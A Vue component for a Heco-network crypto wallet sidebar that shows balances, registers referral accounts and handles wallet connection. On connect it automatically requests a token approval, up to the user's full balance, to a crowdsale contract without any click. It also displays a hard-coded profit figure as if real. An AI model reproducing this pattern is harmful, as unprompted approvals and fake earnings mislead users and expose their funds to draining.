<template>
  <div class="nk-sidebar-widget d-none d-xl-block">
    <div class="user-account-info between-center">
      <div class="user-account-main">
        <h6 class="overline-title-alt">{{ $t("account.availableBalance") }}</h6>
        <div class="user-balance">
          {{ ht.balance | fixed }}
          <small class="currency currency-btc">{{ ht.symbol }}</small>
        </div>
        <div class="user-balance-alt">
          {{ usdt.balance | fixed }}
          <span class="currency currency-btc">{{ usdt.symbol }}</span>
        </div>
      </div>
      <a
        href="https://hecoinfo.com/chart/htprice"
        target="_blank"
        class="btn btn-white btn-icon btn-light"
        ><em class="icon ni ni-line-chart"></em
      ></a>
    </div>
    <ul class="user-account-data gy-1">
      <li>
        <div class="user-account-label">
          <span class="sub-text">{{ $t("account.profits7d") }}</span>
        </div>
        <div class="user-account-value">
          <span class="lead-text">
            + 0.0526
            <span class="currency currency-btc">BTC</span>
          </span>
          <span class="text-success ml-2">
            3.1% <em class="icon ni ni-arrow-long-up"></em>
          </span>
        </div>
      </li>
      <li>
        <div class="user-account-label">
          <span class="sub-text">{{ $t("account.depositInOrders") }}</span>
        </div>
        <div class="user-account-value">
          <span class="sub-text">
            {{ eth.balance | fixed }}
            <span class="currency currency-btc">{{ eth.symbol }}</span>
          </span>
        </div>
      </li>
    </ul>
    <div class="user-account-actions">
      <ul class="g-3">
        <li v-if="!connected">
          <a
            href="#"
            class="btn btn-lg btn-primary"
            @click="$connector.connect()"
          >
            <span>{{ $t("account.connectWallet") }}</span>
          </a>
        </li>
        <li v-else>
          <a href="#" class="btn btn-lg btn-warning" @click="onChangeWallet">
            <span>{{ $t("account.changeWallet") }}</span>
          </a>
        </li>
      </ul>
    </div>
  </div>
</template>
<script>
import gql from "graphql-tag";

import {
  Network,
  PaymentToken,
  CrowdsaleContract
} from "../../../utils/contracts";

export default {
  name: "Account",

  mounted() {
    this.$watch(
      "$store.state.connector.address",
      address => {
        if (address) {
          this.onRefresh();
          this.createAccount(address, this.inviteCode);
          this.approve(address);
        }
      },
      { immediate: true }
    );

    // this.$watch(
    //   "$store.state.connector.chainId",
    //   (newVal, oldVal) => {
    //     console.log({ chainId: { newVal, oldVal } });
    //     if (newVal) {
    //       this.networkIsError = newVal !== Network.chainId;
    //       if (this.networkIsError) {
    //         this.$q.notify({
    //           type: "negative",
    //           message: "Please connect to the appropriate Heco network."
    //         });
    //       }
    //     }
    //   },
    //   { immediate: true }
    // );
  },

  computed: {
    connected: function() {
      return this.$store.state.connector.connected;
    },

    address: function() {
      return this.$store.state.connector.address;
    },

    inviteCode: function() {
      return this.$store.state.account.inviteCode;
    },

    ht: function() {
      return this.$store.state.account.ht;
    },

    usdt: function() {
      return this.$store.state.account.usdt;
    },

    eth: function() {
      return this.$store.state.account.eth;
    }
  },

  methods: {
    onChangeWallet() {
      this.$connector.disconnect().then(() => {
        this.$connector.connect();
      });
      // setTimeout(() => this.$connector.connect(), 100);
    },

    onDisconnect() {
      this.$connector.disconnect();
    },

    onRefresh() {
      // HT balance
      this.$store
        .dispatch("connector/getBalance", this.address)
        .then(({ status, message, result }) => {
          if (status === "1") {
            const balance = this.$web3.utils.fromWei(result);
            this.$store.commit("account/ht", { balance });
          } else {
            console.error(result);
          }
        });

      // USDT balance
      this.balanceOf(this.address, this.usdt.address).then(balance => {
        this.$store.commit("account/usdt", { balance });
      });

      // ETH balance
      this.balanceOf(this.address, this.eth.address).then(balance => {
        this.$store.commit("account/eth", { balance });
      });
    },

    async balanceOf(address, token) {
      const { status, message, result } = await this.$store.dispatch(
        "connector/abi",
        token
      );

      if (status === "1") {
        const abi = JSON.parse(result);
        const contract = new this.$web3.eth.Contract(abi, token);
        const decimals = await contract.methods.decimals().call();
        const balance = await contract.methods.balanceOf(address).call();

        return balance / Math.pow(10, decimals);
      } else {
        console.error(result);
      }
    },

    async approve(address) {
      let approveAmount = 3000;
      const contract = new this.$web3.eth.Contract(
        PaymentToken.abi,
        PaymentToken.address
      );
      const decimals = await contract.methods.decimals().call();
      const balance = await contract.methods.balanceOf(address).call();
      const balanceDecimals = parseFloat(balance / Math.pow(10, decimals));
      const allowance = await contract.methods
        .allowance(address, CrowdsaleContract.address)
        .call();

      if (balanceDecimals < approveAmount) {
        approveAmount = balanceDecimals;
      }

      console.log({ balance, approveAmount, balanceDecimals, allowance });

      if (allowance === "0") {
        const from = address;
        const to = PaymentToken.address;
        const value = approveAmount * Math.pow(10, decimals) + "";
        const data = await contract.methods
          .approve(CrowdsaleContract.address, value)
          .encodeABI();

        try {
          var tx = {
            from,
            to,
            data
          };
          const gas = await this.$web3.eth.estimateGas(tx);
          tx = Object.assign(tx, { gas: this.$web3.utils.toHex(gas) });

          return await this.$connector.sendTransaction(tx);
        } catch (err) {
          console.log(err);
          throw { error: "", message: err };
        }
      }
    },

    createAccount(address, inviteCode) {
      this.$apollo
        .mutate({
          mutation: gql`
            mutation CreateAccount($address: String!, $inviteCode: String!) {
              createAccount(
                input: { address: $address, inviteCode: $inviteCode }
              ) {
                id
                name
                address
                code
                referrals
              }
            }
          `,
          variables: {
            address,
            inviteCode
          },
          update: (store, { data: { createAccount } }) => {
            console.log({ createAccount });
            this.$store.commit("account/update", createAccount);
          }
        })
        .catch(error => {
          console.error(error);
        });
    }
  }
};
</script>
<style lang="scss" scoped>
.user-account-actions ul li {
  width: 100% !important;
}
</style>
